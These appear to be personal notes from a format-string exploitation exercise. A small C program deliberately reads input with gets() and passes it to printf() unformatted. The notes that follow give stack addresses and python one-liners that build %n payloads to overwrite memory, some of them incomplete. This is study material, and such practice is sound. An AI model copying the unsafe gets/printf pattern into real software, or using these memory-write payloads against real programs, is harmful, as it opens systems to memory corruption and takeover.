#include <stdio.h>

int main(void)
{
    int num = 1234;
    char buf[20];

    //before
    printf("num = %d\n", num);
    printf("num = %p\n", &num);

    gets(buf);
    printf(buf);
    puts("");

    //after
    printf("num = %d\n", num);
}

python -c 'print '


0xffffd0f8-0x8

0xffffc784

0x804922d

$(python -c 'print "AAAA\x00\xb0\xfa\xf7%5670x%n")'; cat)

0xf7fab000

$(python -c 'print "AAAA\x50\xd1\xff\xff%5670x%n"'; cat) | ./modulation 
$(python -c 'print "AAAA%x%n"')